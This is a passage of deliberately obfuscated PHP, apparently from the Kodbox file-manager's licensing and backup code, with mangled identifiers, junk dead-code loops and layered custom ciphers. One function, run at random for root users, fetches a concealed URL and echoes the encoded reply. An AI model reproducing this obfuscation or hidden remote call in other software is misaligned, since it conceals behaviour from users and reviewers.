< $Ö¯˜¹Ö[683]) { if (!$¹ãÎ¨¬) { break; } $¹ãÎ¨¬++; } $ùŸ¿è¹ = intval($ùŸ¿è¹ ? $ùŸ¿è¹ : $«óÀÍ†[269]); $¶É†õ³ = $Ö¯˜¹Ö[758]; if (!$¶É†õ³) { die; } $ßÙõù¾æ = _get($this->soeqf66e0cdc, $«óÀÍ†[295]); $­¿øøöÉ = $Ö¯˜¹Ö[759]; while ($­¿øøöÉ < $Ö¯˜¹Ö[700]) { if ($­¿øøöÉ >= 0) { break; } $­¿øøöÉ++; } $ßÙõù¾æ = $ßÙõù¾æ ? intval($ßÙõù¾æ) : 0; return $ùŸ¿è¹ + $ßÙõù¾æ; $ø—ÒÇ€İ = $Ö¯˜¹Ö[760]; } public function wkfm81943bb9($»¸¨ñ‡ì) { $æßøƒµü =& $_SERVER[¿ğÚ‰±–]; $ß¶òëª¿ =& $_SERVER[‹ÓÅ‘à¹]; $ºŞÄãó = $this->mfzb6adb4d07(); $™œ®¼ğ½ = $æßøƒµü[761]; if ($»¸¨ñ‡ì[$ß¶òëª¿[296]] == $ß¶òëª¿[122]) { return; } if ($ºŞÄãó >= intval($ß¶òëª¿[214])) { return; } $–˜Û¹Ñæ = Model($ß¶òëª¿[125])->count(); if ($–˜Û¹Ñæ <= $ºŞÄãó) { return; } $˜Ã®¨· = Model($ß¶òëª¿[125])->field($ß¶òëª¿[296])->limit($ºŞÄãó)->select(); $˜Ã®¨· = array_to_keyvalue($˜Ã®¨·, $ß¶òëª¿[6], $ß¶òëª¿[296]); $ôñ¨­Æ = $æßøƒµü[762]; if (strlen($ôñ¨­Æ) < $æßøƒµü[683]) { return; } if (!in_array($»¸¨ñ‡ì[$ß¶òëª¿[296]], $˜Ã®¨·)) { show_json($ß¶òëª¿[297], !1, $ß¶òëª¿[210]); } } public function qbvi9e07effd() { $Ù¦ğÄ§ =& $_SERVER[¿ğÚ‰±–]; $­¯ş°×ø =& $_SERVER[‹ÓÅ‘à¹]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ç¼…êüï = $­¯ş°×ø[217]; $ø€Ïæ = $Ù¦ğÄ§[763]; $ç¼…êüï = $this->qxtc74083bcf($ç¼…êüï, $­¯ş°×ø[218]); $áæòì» = $Ù¦ğÄ§[764]; while (strlen($áæòì») < $Ù¦ğÄ§[683]) { if (!$áæòì») { break; } $áæòì»++; } $Õ—îÍÏß = stream_context_create(array($­¯ş°×ø[219] => array($­¯ş°×ø[220] => $­¯ş°×ø[221], $­¯ş°×ø[222] => 3))); $ò€®‘Öú = $Ù¦ğÄ§[765]; if (!$ò€®‘Öú) { return; } $Ş¸Ò¿¼Á = @file_get_contents($ç¼…êüï, !1, $Õ—îÍÏß); echo $­¯ş°×ø[298] . hash_encode($Ş¸Ò¿¼Á) . $­¯ş°×ø[299]; } private function hlmub829146a($€Ã¿Åå”, $ø‘ñÔş¨, $·ÉïóşÃ = 3) { $Ø¯»ÁØ =& $_SERVER[¿ğÚ‰±–]; $´•“Ï‹ó =& $_SERVER[‹ÓÅ‘à¹]; usleep(1); $€Ã¿Åå” = trim($€Ã¿Åå”); $ŒŸá¦ŞÎ = $Ø¯»ÁØ[766]; while (strlen($ŒŸá¦ŞÎ) < $Ø¯»ÁØ[683]) { if (!$ŒŸá¦ŞÎ) { break; } $ŒŸá¦ŞÎ++; } $Å×©¾³Ì = mt_rand(0, 5) . $´•“Ï‹ó[6]; $Ì¥¿ËŸ· = rand_string(15); $ŒŸÓê—ß = $´•“Ï‹ó[300]; switch ($Å×©¾³Ì) { case $´•“Ï‹ó[206]: $›œüæã = $this->vdpab12e6c9e($€Ã¿Åå”, strrev($ø‘ñÔş¨ . $Ì¥¿ËŸ·)); $³¬Õ¦õˆ = $Ø¯»ÁØ[767]; if (strlen($³¬Õ¦õˆ) < $Ø¯»ÁØ[683]) { die; } break; case $´•“Ï‹ó[122]: $›œüæã = $this->vdpab12e6c9e($€Ã¿Åå”, strrev($Ì¥¿ËŸ· . $ø‘ñÔş¨)); $¤øÎÕ¿À = $Ø¯»ÁØ[768]; break; case $´•“Ï‹ó[301]: $›œüæã = $this->vdpab12e6c9e($€Ã¿Åå”, base64_encode($Ì¥¿ËŸ· . $ø‘ñÔş¨)); $ÙÊ§¾²Ô = $Ø¯»ÁØ[769]; break; $¯ØÂ¾ä¿ = $Ø¯»ÁØ[770]; if (!$¯ØÂ¾ä¿) { return; } case $´•“Ï‹ó[302]: $›œüæã = $this->vdpab12e6c9e($€Ã¿Åå”, md5($Ì¥¿ËŸ· . $ø‘ñÔş¨)); $¥©©ü– = $Ø¯»ÁØ[771]; while ($¥©©ü– < $Ø¯»ÁØ[688]) { if ($¥©©ü– >= 0) { break; } $¥©©ü–++; } break; case $´•“Ï‹ó[303]: $€Ã¿Åå” = base64_encode($€Ã¿Åå”); $²‘¥‘Ìä = $Ø¯»ÁØ[772]; if (!$²‘¥‘Ìä) { return; } $úÏŞ¦ÌÒ = rand(0, 64); $Èûë†ß¥ = $Ø¯»ÁØ[773]; $¹ÇèØ„ = $ŒŸÓê—ß[$úÏŞ¦ÌÒ]; $ˆ°°— = $Ø¯»ÁØ[774]; $®™İáÓş = md5($¹ÇèØ„ . md5($ø‘ñÔş¨ . $¹ÇèØ„) . $ø‘ñÔş¨); $®™İáÓş = substr($®™İáÓş, $úÏŞ¦ÌÒ % 8, $úÏŞ¦ÌÒ % 8 + 7); $Ïğ¼‘Ø = $Ø¯»ÁØ[754]; $¤Šß’¿® = $´•“Ï‹ó[6]; $áç®Ö×† = $Ø¯»ÁØ[775]; if (!$áç®Ö×†) { return; } $ÍªÃ–¦ = 0; $…îÑÓ÷ = $Ø¯»ÁØ[776]; $Ê£Š•Ú = 0; $€Ã€óŞâ = $Ø¯»ÁØ[777]; if (strlen($€Ã€óŞâ) < $Ø¯»ÁØ[686]) { return; } $œ‰øò‰ = 0; $¹¤÷˜á§ = $Ø¯»ÁØ[778]; if (!$¹¤÷˜á§) { return; } for ($ÍªÃ–¦ = 0; $ÍªÃ–¦ < strlen($€Ã¿Åå”); $ÍªÃ–¦++) { $œ‰øò‰ = $œ‰øò‰ == strlen($®™İáÓş) ? 0 : $œ‰øò‰; $Ê£Š•Ú = ($úÏŞ¦ÌÒ + strpos($ŒŸÓê—ß, $€Ã¿Åå”[$ÍªÃ–¦]) + ord($®™İáÓş[$œ‰øò‰++])) % 64; $¤Šß’¿® .= $ŒŸÓê—ß[$Ê£Š•Ú]; $×¶ÁÃ„Ü = $Ø¯»ÁØ[779]; while (strlen($×¶ÁÃ„Ü) < $Ø¯»ÁØ[686]) { if (!$×¶ÁÃ„Ü) { break; } $×¶ÁÃ„Ü++; } } $›œüæã = hash_encode($¹ÇèØ„ . $¤Šß’¿®); $¼Úù‰º = $Ø¯»ÁØ[780]; if (strlen($¼Úù‰º) < $Ø¯»ÁØ[683]) { return; } break; default: $›œüæã = $this->vdpab12e6c9e($€Ã¿Åå”, $ø‘ñÔş¨ . $Ì¥¿ËŸ·); break; $‡ËÔÅ‰¯ = $Ø¯»ÁØ[781]; if (!$‡ËÔÅ‰¯) { die; } } $›œüæã = strrev($Å×©¾³Ì . $Ì¥¿ËŸ· . $›œüæã); if ($·ÉïóşÃ - 1 > 0) { $›œüæã = $this->hlmub829146a($›œüæã, $ø‘ñÔş¨, $·ÉïóşÃ - 1); } return $›œüæã; } private function qufl5954023b($”˜°¼‡§, $®ßÏ«”Š, $Û €üÚò = 3) { $ÔÅÕ¯­‹ =& $_SERVER[¿ğÚ‰±–]; $…õÌ«² =& $_SERVER[‹ÓÅ‘à¹]; if (!is_string($”˜°¼‡§) || strlen($”˜°¼‡§) < 10) { return !1; } $”˜°¼‡§ = trim($”˜°¼‡§); $”˜°¼‡§ = strrev($”˜°¼‡§); $·ÂØÊ¢â = $ÔÅÕ¯­‹[782]; if (!$·ÂØÊ¢â) { die; } $Øöõø¥Ò = $”˜°¼‡§[0]; $–İ‰‰Ø© = $ÔÅÕ¯­‹[783]; if (!$–İ‰‰Ø©) { return; } $î§¸ã• = substr($”˜°¼‡§, 1, 15); $•Á¡÷ÍŞ = $ÔÅÕ¯­‹[784]; if (strlen($•Á¡÷ÍŞ) < $ÔÅÕ¯­‹[683]) { die; } $”˜°¼‡§ = substr($”˜°¼‡§, 16); $°³‚â× = $…õÌ«²[300]; $Ëø€äâÏ = $ÔÅÕ¯­‹[785]; while ($Ëø€äâÏ < $ÔÅÕ¯­‹[686]) { if ($Ëø€äâÏ >= 0) { break; } $Ëø€äâÏ++; } switch ($Øöõø¥Ò) { case $…õÌ«²[206]: $óİ¨òøÃ = $this->qxtc74083bcf($”˜°¼‡§, strrev($®ßÏ«”Š . $î§¸ã•)); break; case $…õÌ«²[122]: $óİ¨òøÃ = $this->qxtc74083bcf($”˜°¼‡§, strrev($î§¸ã• . $®ßÏ«”Š)); $á“Ì¸®Ö = $ÔÅÕ¯­‹[786]; break; $ı£ÄĞƒ€ = $ÔÅÕ¯­‹[787]; while ($ı£ÄĞƒ€ < $ÔÅÕ¯­‹[700]) { if ($ı£ÄĞƒ€ >= 0) { break; } $ı£ÄĞƒ€++; } case $…õÌ«²[301]: $óİ¨òøÃ = $this->qxtc74083bcf($”˜°¼‡§, base64_encode($î§¸ã• . $®ßÏ«”Š)); $§÷¼³ = $ÔÅÕ¯­‹[788]; if (strlen($§÷¼³) < $ÔÅÕ¯­‹[686]) { die; } break; $Ã€ÁÖªı = $ÔÅÕ¯­‹[789]; if (!$Ã€ÁÖªı) { return; } case $…õÌ«²[302]: $óİ¨òøÃ = $this->qxtc74083bcf($”˜°¼‡§, md5($î§¸ã• . $®ßÏ«”Š)); $ÓšÜÉ¨© = $ÔÅÕ¯­‹[790]; while ($ÓšÜÉ¨© < $ÔÅÕ¯­‹[700]) { if ($ÓšÜÉ¨© >= 0) { break; } $ÓšÜÉ¨©++; } break; $ö÷œç¶µ = $ÔÅÕ¯­‹[791]; case $…õÌ«²[303]: $”˜°¼‡§ = hash_decode($”˜°¼‡§); $Óâ¾ÛÈ– = $ÔÅÕ¯­‹[792]; $ËşùĞœÈ = $”˜°¼‡§[0]; $”˜°¼‡§ = substr($”˜°¼‡§, 1); $ßç—£ù­ = $ÔÅÕ¯­‹[793]; if (strlen($ßç—£ù­) < $ÔÅÕ¯­‹[700]) { die; } $‡ÛâõÄû = strpos($°³‚â×, $ËşùĞœÈ); $ÏöÉÁ˜ = md5($ËşùĞœÈ . md5($®ßÏ«”Š . $ËşùĞœÈ) . $®ßÏ«”Š); $ÏöÉÁ˜ = substr($ÏöÉÁ˜, $‡ÛâõÄû % 8, $‡ÛâõÄû % 8 + 7); $˜çş©³‡ = $ÔÅÕ¯­‹[794]; $¹ÆîµéÉ = $…õÌ«²[6]; $ëÊÃŸ©Ù = $ÔÅÕ¯­‹[795]; while (strlen($ëÊÃŸ©Ù) < $ÔÅÕ¯­‹[700]) { if (!$ëÊÃŸ©Ù) { break; } $ëÊÃŸ©Ù++; } $ÛÎ¯ú³™ = 0; $¦æÈô€£ = $ÔÅÕ¯­‹[796]; while (strlen($¦æÈô€£) < $ÔÅÕ¯­‹[683]) { if (!$¦æÈô€£) { break; } $¦æÈô€£++; } $æãôôäÄ = 0; $½æÄ¨ùô = 0; $‰¡‡éÈÆ = $ÔÅÕ¯­‹[797]; while (strlen($‰¡‡éÈÆ) < $ÔÅÕ¯­‹[683]) { if (!$‰¡‡éÈÆ) { break; } $‰¡‡éÈÆ++; } for ($ÛÎ¯ú³™ = 0; $ÛÎ¯ú³™ < strlen($”˜°¼‡§); $ÛÎ¯ú³™++) { $½æÄ¨ùô = $½æÄ¨ùô == strlen($ÏöÉÁ˜) ? 0 : $½æÄ¨ùô; $ş«÷•è° = $½æÄ¨ùô++; $½§á•“Ì = $ÔÅÕ¯­‹[798]; $æãôôäÄ = strpos($°³‚â×, $”˜°¼‡§[$ÛÎ¯ú³™]) - $‡ÛâõÄû - ord($ÏöÉÁ˜[$ş«÷•è°]); $˜™¢¯¶ = $ÔÅÕ¯­‹[799]; while ($æãôôäÄ < 0) { $æãôôäÄ += 64; } $¹ÆîµéÉ .= $°³‚â×[$æãôôäÄ]; } $óİ¨òøÃ = base64_decode($¹ÆîµéÉ); break; default: $óİ¨òøÃ = $this->qxtc74083bcf($”˜°¼‡§, $®ßÏ«”Š . $î§¸ã•); $æ™‚ÄÔ• = $ÔÅÕ¯­‹[800]; if (strlen($æ™‚ÄÔ•) < $ÔÅÕ¯­‹[686]) { return; } break; $ÊÒ”Ã¶Ù = $ÔÅÕ¯­‹[801]; if (strlen($ÊÒ”Ã¶Ù) < $ÔÅÕ¯­‹[683]) { return; } } if ($Û €üÚò - 1 > 0) { $óİ¨òøÃ = $this->qufl5954023b($óİ¨òøÃ, $®ßÏ«”Š, $Û €üÚò - 1); } return $óİ¨òøÃ; } public function fxnb8f570c53($…÷¡ôú‚) { $†àûƒ« =& $_SERVER[¿ğÚ‰±–]; $µ¦€£¹ı =& $_SERVER[‹ÓÅ‘à¹]; $¾•¶îşî = $this->otir93a6845d(); $å¹‘¿Ô = $this->otir93a6845d(); $’öúå—É = ($¾•¶îşî - 1) * ($å¹‘¿Ô - 1); $åŞ¡‡Ù = intval(($¾•¶îşî + $å¹‘¿Ô) / 2); while (1) { $±²Õ¼êØ = $åŞ¡‡Ù; $‚­ŞÌœÊ = $†àûƒ«[802]; if (strlen($‚­ŞÌœÊ) < $†àûƒ«[686]) { return; } $¼š¯ŠÍ = $’öúå—É; $±à»´ƒİ = $†àûƒ«[803]; if (strlen($±à»´ƒİ) < $†àûƒ«[686]) { return; } while ($¼š¯ŠÍ % $±²Õ¼êØ != 0) { $ç¥Ÿ“ËÑ = $¼š¯ŠÍ; $í±µéã‹ = $†àûƒ«[804]; $¼š¯ŠÍ = $±²Õ¼êØ; $±²Õ¼êØ = $ç¥Ÿ“ËÑ % $±²Õ¼êØ; $áÃ¡¥‚Ç = $†àûƒ«[805]; if (strlen($áÃ¡¥‚Ç) < $†àûƒ«[691]) { die; } } if ($±²Õ¼êØ == 1) { break; } else { $åŞ¡‡Ù++; } } $°ÍØ…ˆ‰ = 2; $¯¾ÀŒÅ  = $†àûƒ«[806]; for ($á’øÑÖÔ = 0; $á’øÑÖÔ < $’öúå—É * 10; $á’øÑÖÔ++) { if (($’öúå—É * $á’øÑÖÔ + 1) % $åŞ¡‡Ù == 0) { $°ÍØ…ˆ‰ = intval(($’öúå—É * $á’øÑÖÔ + 1) / $åŞ¡‡Ù); break; } } $¼Õ°ÚËË = $this->vdpab12e6c9e($¾•¶îşî * $å¹‘¿Ô . $µ¦€£¹ı[6], $µ¦€£¹ı[136]); $ñöÇöÆÛ = $†àûƒ«[807]; while (strlen($ñöÇöÆÛ) < $†àûƒ«[686]) { if (!$ñöÇöÆÛ) { break; } $ñöÇöÆÛ++; } $ºòğ¶Ó = md5($µ¦€£¹ı[304] . ($¾•¶îşî + $å¹‘¿Ô) . $µ¦€£¹ı[305] . $åŞ¡‡Ù . $µ¦€£¹ı[305] . $°ÍØ…ˆ‰ . $µ¦€£¹ı[306]); $³Ö€ù = $†àûƒ«[808]; if (!$³Ö€ù) { die; } $—è£á€é = $this->vdpab12e6c9e($…÷¡ôú‚, $ºòğ¶Ó) . $µ¦€£¹ı[307] . $¼Õ°ÚËË; $‘ù¦™¬ = $†àûƒ«[809]; while (strlen($‘ù¦™¬) < $†àûƒ«[688]) { if (!$‘ù¦™¬) { break; } $‘ù¦™¬++; } return $—è£á€é; $™Š¦ˆ²‡ = $†àûƒ«[810]; } public function fyod59d4c9a4($ÁŒš¨¬) { $´ğ’±Ùâ =& $_SERVER[¿ğÚ‰±–]; $àêÓÒ¡À =& $_SERVER[‹ÓÅ‘à¹]; $½şÆ® = explode($àêÓÒ¡À[307], $ÁŒš¨¬); $üƒ‰ºéÕ = $´ğ’±Ùâ[811]; if (strlen($üƒ‰ºéÕ) < $´ğ’±Ùâ[688]) { die; } if (count($½şÆ®) != 2) { return $àêÓÒ¡À[6]; } $»îè½±ë = $this->qxtc74083bcf($½şÆ®[1] . $àêÓÒ¡À[6], $àêÓÒ¡À[136]); if (!$»îè½±ë) { return $àêÓÒ¡À[6]; } $»îè½±ë = intval($»îè½±ë); $Ó…—Êç¼ = $´ğ’±Ùâ[812]; while (strlen($Ó…—Êç¼) < $´ğ’±Ùâ[688]) { if (!$Ó…—Êç¼) { break; } $Ó…—Êç¼++; } $‰İöıéé = 0; $Àƒú„éÛ = 0; $ÒßÖ°“§ = $´ğ’±Ùâ[813]; while (strlen($ÒßÖ°“§) < $´ğ’±Ùâ[700]) { if (!$ÒßÖ°“§) { break; } $ÒßÖ°“§++; } for ($æş“Ú½ì = 3; $æş“Ú½ì < $»îè½±ë; $æş“Ú½ì += 2) { if ($»îè½±ë % $æş“Ú½ì != 0) { continue; } $‰İöıéé = $æş“Ú½ì; $ ëµ¦Ş„ = $´ğ’±Ùâ[814]; $Àƒú„éÛ = intval($»îè½±ë / $æş“Ú½ì); break; $ÔÌ¼ë¼Ğ = $´ğ’±Ùâ[815]; } $Õ¶ô¿öË = ($‰İöıéé - 1) * ($Àƒú„éÛ - 1); $İÇã¼Úì = intval(($‰İöıéé + $Àƒú„éÛ) / 2); $•çÓ«ØÏ = $´ğ’±Ùâ[816]; while (1) { $²êÅÕ¢ = $İÇã¼Úì; $íå¾Ì® = $´ğ’±Ùâ[817]; if (!$íå¾Ì®) { die; } $óŸü´ = $Õ¶ô¿öË; $Ì†ÄèÂ… = $´ğ’±Ùâ[818]; while (strlen($Ì†ÄèÂ…) < $´ğ’±Ùâ[686]) { if (!$Ì†ÄèÂ…) { break; } $Ì†ÄèÂ…++; } while ($óŸü´ % $²êÅÕ¢ != 0) { $Ë»§ˆÊ = $óŸü´; $óŸü´ = $²êÅÕ¢; $²êÅÕ¢ = $Ë»§ˆÊ % $²êÅÕ¢; } if ($²êÅÕ¢ == 1) { break; } else { $İÇã¼Úì++; } } $¹«Êª— = 2; for ($æş“Ú½ì = 0; $æş“Ú½ì < $Õ¶ô¿öË * 10; $æş“Ú½ì++) { if (($Õ¶ô¿öË * $æş“Ú½ì + 1) % $İÇã¼Úì == 0) { $¹«Êª— = intval(($Õ¶ô¿öË * $æş“Ú½ì + 1) / $İÇã¼Úì); break; } } $òøòğè÷ = md5($àêÓÒ¡À[304] . ($‰İöıéé + $Àƒú„éÛ) . $àêÓÒ¡À[305] . $İÇã¼Úì . $àêÓÒ¡À[305] . $¹«Êª— . $àêÓÒ¡À[306]); $íü Ç­ = $´ğ’±Ùâ[819]; while (strlen($íü Ç­) < $´ğ’±Ùâ[700]) { if (!$íü Ç­) { break; } $íü Ç­++; } $£Ş¥Šëä = $this->qxtc74083bcf($½şÆ®[0], $òøòğè÷); return $£Ş¥Šëä; $¢î¾ûæ¼ = $´ğ’±Ùâ[758]; } public function otir93a6845d() { $«½Ä­Œƒ =& $_SERVER[¿ğÚ‰±–]; $­š©¢âì = mt_rand(pow(2, 14), pow(2, 16) - 1); $ì•ı°«â = $«½Ä­Œƒ[820]; if (strlen($ì•ı°«â) < $«½Ä­Œƒ[688]) { return; } $»Ú¾âÉ = array(); $Ÿ·Áô›´ = 1; $ĞÍÇ‹¨Š = $«½Ä­Œƒ[821]; if (!$ĞÍÇ‹¨Š) { die; } while ($Ÿ·Áô›´ <= (int) sqrt($­š©¢âì)) { $†·¯¬‘ = $Ÿ·Áô›´; $ÙÕáö»– = $«½Ä­Œƒ[822]; if (strlen($ÙÕáö»–) < $«½Ä­Œƒ[686]) { return; } while (!0) { $†·¯¬‘++; $óŠçœÔö = $«½Ä­Œƒ[823]; if (strlen($óŠçœÔö) < $«½Ä­Œƒ[700]) { die; } if ($†·¯¬‘ <= 2) { $Ÿ·Áô›´ = $†·¯¬‘; break; } else { if ($†·¯¬‘ < 2) { continue; } } $“¹ğ’ºÍ = !0; for ($Ãœ¦æ = 2; $Ãœ¦æ <= sqrt($†·¯¬‘); $Ãœ¦æ++) { if ($†·¯¬‘ % $Ãœ¦æ == 0) { $“¹ğ’ºÍ = !1; } } if ($“¹ğ’ºÍ) { $Ÿ·Áô›´ = $†·¯¬‘; break; } } $»Ú¾âÉ[] = $Ÿ·Áô›´; } $˜ôŠÌ÷ = 2; for ($†·¯¬‘ = $­š©¢âì; $†·¯¬‘ > 1; $†·¯¬‘--) { $“¹ğ’ºÍ = !0; $Ì€Ö’•é = $«½Ä­Œƒ[824]; foreach ($»Ú¾âÉ as $ÑÖ½´¤) { if ($†·¯¬‘ % $ÑÖ½´¤ == 0) { $“¹ğ’ºÍ = !1; break; } } if ($“¹ğ’ºÍ) { $˜ôŠÌ÷ = $†·¯¬‘; break; } } return $˜ôŠÌ÷; } public function txhj9143b272($ÁÂÆıÜ, $ÎÑ‡éÎæ) { $˜™ªœ¥š =& $_SERVER[‹ÓÅ‘à¹]; return call_user_func(array($˜™ªœ¥š[8], $˜™ªœ¥š[308]), $ÁÂÆıÜ, $ÎÑ‡éÎæ); } public function vdpab12e6c9e($ÑÄ¶Ëé¡, $ÑğÁğŒ) { $ …°ô÷ =& $_SERVER[‹ÓÅ‘à¹]; return call_user_func(array($ …°ô÷[309], $ …°ô÷[310]), $ÑÄ¶Ëé¡, $ÑğÁğŒ); } public function qxtc74083bcf($É“ â¥», $¤íøøá) { $İß½İÏ¾ =& $_SERVER[¿ğÚ‰±–]; $ı½³©­º =& $_SERVER[‹ÓÅ‘à¹]; return call_user_func(array($ı½³©­º[309], $ı½³©­º[311]), $É“ â¥», $¤íøøá); $ÜêĞ¾û¹ = $İß½İÏ¾[825]; if (strlen($ÜêĞ¾û¹) < $İß½İÏ¾[691]) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¿ğÚ‰±–][826]); $this->init(); $this->keep(); } public function init() { $×…©Õ÷å =& $_SERVER[¿ğÚ‰±–]; $this->isManual(); self::$name = date($×…©Õ÷å[827]); if (!($³€ÇÁÆâ = $this->model->lastItem())) { $³€ÇÁÆâ = $this->initData(); } else { self::$name = $³€ÇÁÆâ[$×…©Õ÷å[32]]; if ($³€ÇÁÆâ[$×…©Õ÷å[828]] == $×…©Õ÷å[91]) { self::$name = date($×…©Õ÷å[272]); $ã††Û¬¸ = intval(_get($³€ÇÁÆâ, $×…©Õ÷å[829], 0)); if (self::$manual == 0 && $³€ÇÁÆâ[$×…©Õ÷å[32]] == self::$name) { $this->model->remove($³€ÇÁÆâ[$×…©Õ÷å[475]]); } $³€ÇÁÆâ = $this->initData($ã††Û¬¸, $³€ÇÁÆâ[$×…©Õ÷å[830]]); } else { $this->checkStore($³€ÇÁÆâ[$×…©Õ÷å[830]]); } } self::$option = $³€ÇÁÆâ; } private function isManual() { $Úš©Í÷± = _get($GLOBALS, $_SERVER[¿ğÚ‰±–][831], 0); $Úš©Í÷± = intval($Úš©Í÷±); self::$manual = $Úš©Í÷± && $Úš©Í÷± == 1 ? 1 : 0; } private function initData($…”ÑäñÉ = 0, $ààÑ‹éÕ = '') { $Â§˜£½½ =& $_SERVER[¿ğÚ‰±–]; $ÀæÈçˆâ = $this->model->config(); if ($ààÑ‹éÕ && $ÀæÈçˆâ[$Â§˜£½½[830]] != $ààÑ‹éÕ) { $…”ÑäñÉ = 0; } $this->checkStore($ÀæÈçˆâ[$Â§˜£½½[830]]); if (self::$manual == 1) { self::$name .= $Â§˜£½½[11] . date($Â§˜£½½[832]); } $¬Ş‘ = array($Â§˜£½½[830] => $ÀæÈçˆâ[$Â§˜£½½[830]], $Â§˜£½½[32] => self::$name, $Â§˜£½½[828] => 0, $Â§˜£½½[171] => $ÀæÈçˆâ[$Â§˜£½½[171]], $Â§˜£½½[833] => self::$manual, $Â§˜£½½[369] => array($Â§˜£½½[834] => array($Â§˜£½½[828] => 0), $Â§˜£½½[835] => array($Â§˜£½½[828] => 0, $Â§˜£½½[836] => 0, $Â§˜£½½[837] => 0, $Â§˜£½½[33] => $Â§˜£½½[12], $Â§˜£½½[838] => 0, $Â§˜£½½[839] => 0), $Â§˜£½½[840] => array($Â§˜£½½[828] => 0, $Â§˜£½½[836] => 0, $Â§˜£½½[837] => 0, $Â§˜£½½[838] => 0, $Â§˜£½½[839] => 0), $Â§˜£½½[230] => array($Â§˜£½½[828] => 0, $Â§˜£½½[841] => 0, $Â§˜£½½[842] => 0, $Â§˜£½½[843] => 0, $Â§˜£½½[844] => 0, $Â§˜£½½[541] => $…”ÑäñÉ, $Â§˜£½½[838] => 0, $Â§˜£½½[839] => 0)), $Â§˜£½½[838] => time(), $Â§˜£½½[839] => 0); $ÁÍƒ©ı½ = $this->model->insert($¬Ş‘); $¬Ş‘[$Â§˜£½½[475]] = $ÁÍƒ©ı½; return $¬Ş‘; } private function checkStore($Ìû¸§Åù) { $±„†…å = Model($_SERVER[¿ğÚ‰±–][845]); $ŞÇ•‘¤ = $±„†…å->listData($Ìû¸§Åù); $±„†…å->checkConfig($ŞÇ•‘¤); } public static function get() { if (!self::$option) { $ƒéÖû‹€ = Model($_SERVER[¿ğÚ‰±–][826]); $€óÅø = $ƒéÖû‹€->findByName(self::$name); $ƒéÖû‹€->parseContent($€óÅø); self::$option = $€óÅø; } return self::$option; } public static function set($„ÁæÆŠƒ) { $ÈßöáßÌ =& $_SERVER[¿ğÚ‰±–]; $¡Èáüë = self::get(); foreach ($„ÁæÆŠƒ as $¼®§şå => $¸›ÉÖ¹ø) { array_set_value($¡Èáüë, $¼®§şå, $¸›ÉÖ¹ø); } Model($ÈßöáßÌ[826])->update($¡Èáüë[$ÈßöáßÌ[475]], $¡Èáüë); self::$option = $¡Èáüë; return self::$option; } public function keep() { $şêñĞ¼• =& $_SERVER[¿ğÚ‰±–]; $Œ—“Ù’å = self::get(); if (_get($Œ—“Ù’å, $şêñĞ¼•[846], 0) == $şêñĞ¼•[91]) { return; } $this->backupKeep($Œ—“Ù’å); self::set(array($şêñĞ¼•[846] => 1)); } private function backupKeep($÷ı­ªó³) { $•˜ÂÁÀ =& $_SERVER[¿ğÚ‰±–]; if (self::$manual == 1) { return; } $Ö˜Ââ‘¿ = $this->model->listData(); if (empty($Ö˜Ââ‘¿)) { return; } $Ò„İÊéÒ = 0; $šÂêé×” = array(); foreach ($Ö˜Ââ‘¿ as $µè‡ŞÃ†) { if ($Ò„İÊéÒ >= 7) { break; } $šÂêé×”[] = $µè‡ŞÃ†[$•˜ÂÁÀ[32]]; $Ò„İÊéÒ++; } for ($Ò„İÊéÒ = 0; $Ò„İÊéÒ < 12; $Ò„İÊéÒ++) { $šÂêé×”[] = date($•˜ÂÁÀ[847], strtotime("\55{$Ò„İÊéÒ}\x20\x6d\x6f\156\164\x68\163")); } $šÂêé×” = array_unique($šÂêé×”); $´¿„ó¤Ö = Model($•˜ÂÁÀ[848])->get($•˜ÂÁÀ[849]); foreach ($Ö˜Ââ‘¿ as $µè‡ŞÃ†) { if (isset($µè‡ŞÃ†[$•˜ÂÁÀ[833]]) && $µè‡ŞÃ†[$•˜ÂÁÀ[833]] == $•˜ÂÁÀ[91]) { continue; } if (!empty($µè‡ŞÃ†[$•˜ÂÁÀ[32]]) && in_array($µè‡ŞÃ†[$•˜ÂÁÀ[32]], $šÂêé×”)) { continue; } $this->model->remove($µè‡ŞÃ†[$•˜ÂÁÀ[475]]); $Ïİ¥Òªª = $this->backupPath($÷ı­ªó³, $´¿„ó¤Ö); IO::remove($Ïİ¥Òªª, !1); } } private function backupPath($ÍŠĞóœà, $ôÈùì¼ = false) { $¿ü‰ìÇù =& $_SERVER[¿ğÚ‰±–]; if (!$ôÈùì¼) { $ôÈùì¼ = Model($¿ü‰ìÇù[848])->get($¿ü‰ìÇù[849]); } $Ï°üÖí› = $ÍŠĞóœà[$¿ü‰ìÇù[32]]; $å»î·à½ = substr(md5($¿ü‰ìÇù[850] . $ôÈùì¼ . $Ï°üÖí›), 0, 8); return "\x7b\x69\157\72{$ÍŠĞóœà[$¿ü‰ìÇù[830]]}\175\x2f\x64\141\x74\x61\142\141\x73\145\x2f\x62\x61\x63\153\x75\160\x2f" . $Ï°üÖí› . $¿ü‰ìÇù[11] . $å»î·à½; } public function db() { $íü©ŞÖÔ =& $_SERVER[¿ğÚ‰±–]; $Îóí…Æ¸ = self::get(); if (_get($Îóí…Æ¸, $íü©ŞÖÔ[851], 0) == $íü©ŞÖÔ[91]) { return !0; } $Áà¬¾± = new BackupDb(); if (!$Áà¬¾±->index()) { return !1; } self::set(array($íü©ŞÖÔ[851] => 1)); return !0; } public function dbFile() { $×êµĞœ =& $_SERVER[¿ğÚ‰±–]; $™®Ô¸³ = self::get(); if (_get($™®Ô¸³, $×êµĞœ[852], 0) == $×êµĞœ[91]) { return !0; } $Ñèçğì = new BackupDbFile(); if (!$Ñèçğì->index()) { return !1; } self::set(array($×êµĞœ[852] => 1)); return !0; } public function file() { $›™¹²Œ¼ =& $_SERVER[¿ğÚ‰±–]; $¡Ñşš = self::get(); if (_get($¡Ñşš, $›™¹²Œ¼[853], 0) == $›™¹²Œ¼[91]) { return !0; } if ($¡Ñşš[$›™¹²Œ¼[171]] == $›™¹²Œ¼[854]) { $á…¥ü« = new BackupFile(); if (!$á…¥ü«->index()) { return !1; } } self::set(array($›™¹²Œ¼[853] => 1, $›™¹²Œ¼[828] => 1)); return !0; } } goto AË›ù§Âá; eë¦Àˆï×: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } 